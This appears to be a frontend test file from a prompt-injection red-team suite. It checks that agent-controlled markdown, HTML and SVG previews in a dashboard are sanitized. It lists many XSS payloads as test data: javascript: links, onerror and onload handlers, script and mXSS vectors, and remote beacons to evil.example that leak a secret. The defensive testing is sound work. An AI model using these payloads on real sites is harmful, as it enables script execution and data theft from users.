// @vitest-environment jsdom
/**
 * Prompt-injection red-team suite, attack 11 (frontend). See CLAUDE.md →
 * "Prompt-injection protections"; the catalogue is listed in
 * internal/server/agents/redteam_test.go. The CSP header half of attack 11 is
 * TestRedTeam_CSP_BlocksInlineScriptAndFraming in internal/server/redteam_test.go.
 *
 * An agent controls files in the project and tool output, so it controls the
 * markdown and SVG the dashboard previews. Each test renders one payload the
 * way the dashboard does, puts it in the live document, and checks that
 * nothing executes and nothing is fetched.
 */
import { mount } from '@vue/test-utils'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import FilePreview from '../../components/agents/FilePreview.vue'
import { renderSafeMarkdown, sanitizeHtml, svgToDataUrl } from '../../utils/safeMarkdown'

declare global {
  interface Window {
    __pwned?: string
  }
}

const PWN = (tag: string) => `window.__pwned='${tag}'`

/** Attach rendered HTML to the document, as v-html would. */
function attach(html: string): HTMLElement {
  const div = document.createElement('div')
  div.innerHTML = html
  document.body.appendChild(div)
  return div
}

/** Nothing in root may run code or fetch on its own. */
function expectInertAndQuiet(root: HTMLElement) {
  for (const el of Array.from(root.querySelectorAll('*'))) {
    for (const attr of Array.from(el.attributes)) {
      expect(attr.name.toLowerCase().startsWith('on'), `${el.tagName} has ${attr.name}`).toBe(false)
      expect(/^\s*(javascript|vbscript|data:text)/i.test(attr.value), `${el.tagName} ${attr.name}=${attr.value}`).toBe(false)
      expect(['srcset', 'ping', 'style', 'background', 'poster', 'formaction', 'action', 'xlink:href'], `${el.tagName} has ${attr.name}`)
        .not.toContain(attr.name.toLowerCase())
    }
  }
  expect(root.querySelector('script, iframe, frame, object, embed, svg, math, style, link, meta, base, form, video, audio, source, picture')).toBeNull()
  // Only same-origin or data: images may load; a remote <img> is a beacon.
  for (const img of Array.from(root.querySelectorAll('img'))) {
    const src = img.getAttribute('src') || ''
    expect(/^(data:image\/|\/(?!\/))/i.test(src), `img src=${src}`).toBe(true)
  }
}

let fetchSpy: ReturnType<typeof vi.fn>

beforeEach(() => {
  delete window.__pwned
  fetchSpy = vi.fn(() => Promise.reject(new Error('network blocked in test')))
  vi.stubGlobal('fetch', fetchSpy)
})

afterEach(async () => {
  // Give any queued handler (onerror/onload) a chance to fire before asserting.
  await new Promise((r) => setTimeout(r, 20))
  expect(window.__pwned, 'a payload executed').toBeUndefined()
  expect(fetchSpy).not.toHaveBeenCalled()
  document.body.innerHTML = ''
  vi.unstubAllGlobals()
})

describe('red team: agent-controlled markdown', () => {
  it.each([
    ['image src breaks out of its attribute', `![x](x" onerror="${PWN('img-src')})`],
    ['image alt breaks out of its attribute', `![a" onerror="${PWN('img-alt')}](https://e.com/i.png)`],
    ['link href breaks out of its attribute', `[x](https://e.com/" onclick="${PWN('link')})`],
    ['link title breaks out', `[x](https://e.com "t\\" onmouseover=\\"${PWN('title')}")`],
  ])('quote-breaking attributes: %s', (_name, md) => {
    expectInertAndQuiet(attach(renderSafeMarkdown(md)))
  })

  it.each([
    '[x](javascript:alert(1))',
    '[x](JaVaScRiPt:alert(1))',
    '[x](java\tscript:alert(1))',
    '[x](&#106;avascript:alert(1))',
    '[x](vbscript:msgbox(1))',
    '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '<a href="javascript:alert(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>',
  ])('javascript:-style links are neutralised: %s', (md) => {
    const root = attach(renderSafeMarkdown(md))
    expectInertAndQuiet(root)
    for (const a of Array.from(root.querySelectorAll('a'))) {
      const href = a.getAttribute('href')
      if (href !== null) expect(href).toMatch(/^(https?:|mailto:|#|[^:]*$)/i)
    }
  })

  it.each([
    `<img src=x onerror="${PWN('raw-img')}">`,
    `<svg onload="${PWN('svg')}"></svg>`,
    `<details open ontoggle="${PWN('details')}">x</details>`,
    `<body onload="${PWN('body')}">`,
    `<iframe srcdoc="<script>parent.${PWN('srcdoc')}</script>"></iframe>`,
    `<script>${PWN('script')}</script>`,
    `<style>@import url(https://evil.example/x.css)</style>`,
    `<math><mtext><table><mglyph><style><img src=x onerror="${PWN('mxss')}">`,
    `<form action="https://evil.example"><button>go</button></form>`,
  ])('raw HTML event handlers and active elements are dropped: %s', (md) => {
    expectInertAndQuiet(attach(renderSafeMarkdown(md)))
  })

  it.each([
    ['markdown image', '![t](https://evil.example/t.png?leak=secret)'],
    ['raw img', '<img src="https://evil.example/t.png">'],
    ['srcset', '<img src="/a.png" srcset="https://evil.example/t.png 2x">'],
    ['protocol-relative', '![t](//evil.example/t.png)'],
    ['css background', '<div style="background:url(https://evil.example/t.png)">x</div>'],
    ['link ping', '<a href="https://e.com" ping="https://evil.example/p">x</a>'],
    ['video poster', '<video poster="https://evil.example/p.png"></video>'],
  ])('remote image beacons are not fetched: %s', (_name, md) => {
    const root = attach(renderSafeMarkdown(md))
    expectInertAndQuiet(root)
    expect(root.innerHTML).not.toMatch(/<img[^>]+evil\.example/)
  })

  it('a resolver cannot be tricked into a cross-origin or quote-breaking image URL', () => {
    const root = attach(
      renderSafeMarkdown('![a](img.png)\n\n![b](../../../etc/passwd)', {
        resolveImage: (src) => (src === 'img.png' ? `//evil.example/${src}" onerror="${PWN('resolver')}` : null),
      }),
    )
    expectInertAndQuiet(root)
  })

  it('sanitizeHtml applies the same policy to tool output HTML', () => {
    expectInertAndQuiet(attach(sanitizeHtml(`<p onclick="${PWN('p')}">x</p><img src=https://evil.example/b.png>`)))
  })
})

describe('red team: agent-controlled SVG preview', () => {
  const evilSvgs = [
    `<svg xmlns="http://www.w3.org/2000/svg" onload="${PWN('svg-onload')}"><circle r="5"/></svg>`,
    `<svg xmlns="http://www.w3.org/2000/svg"><script>${PWN('svg-script')}</script></svg>`,
    `<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/beacon.png"/></svg>`,
    `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><img src=x onerror="${PWN('svg-fo')}"/></foreignObject></svg>`,
  ]

  it.each(evilSvgs)('FilePreview shows SVG only through <img>: %s', (svg) => {
    const wrapper = mount(FilePreview, {
      attachTo: document.body,
      props: {
        isLoading: false,
        content: { path: 'evil.svg', content: svg, language: 'svg', size: svg.length, binary: false, image: true, mimeType: 'image/svg+xml' },
      },
    })
    try {
      const container = wrapper.find('.image-container').element as HTMLElement
      // No inline SVG from the file (the component's own icons live outside .image-container).
      expect(container.querySelector('svg, script, foreignObject')).toBeNull()
      const img = container.querySelector('img')
      expect(img?.getAttribute('src')).toBe(svgToDataUrl(svg))
      expect(img?.getAttribute('src')).toMatch(/^data:image\/svg\+xml;base64,/)
    } finally {
      wrapper.unmount()
    }
  })

  it('a server-sent data: URL cannot break out of the src attribute', () => {
    const payload = `data:image/svg+xml;base64,AAAA" onerror="${PWN('data-url')}`
    const wrapper = mount(FilePreview, {
      attachTo: document.body,
      props: {
        isLoading: false,
        content: { path: 'evil.svg', content: payload, language: 'svg', size: payload.length, binary: false, image: true, mimeType: 'image/svg+xml' },
      },
    })
    try {
      const img = wrapper.find('.image-container img').element as HTMLImageElement
      expect(img.getAttribute('onerror')).toBeNull()
      expect(img.getAttribute('src')).toBe(payload)
    } finally {
      wrapper.unmount()
    }
  })

  it('markdown that embeds SVG renders it as an image, never inline', () => {
    const data = svgToDataUrl(evilSvgs[0]!)
    const root = attach(renderSafeMarkdown(`![logo](${data})\n\n${evilSvgs[1]}`))
    expectInertAndQuiet(root)
  })
})
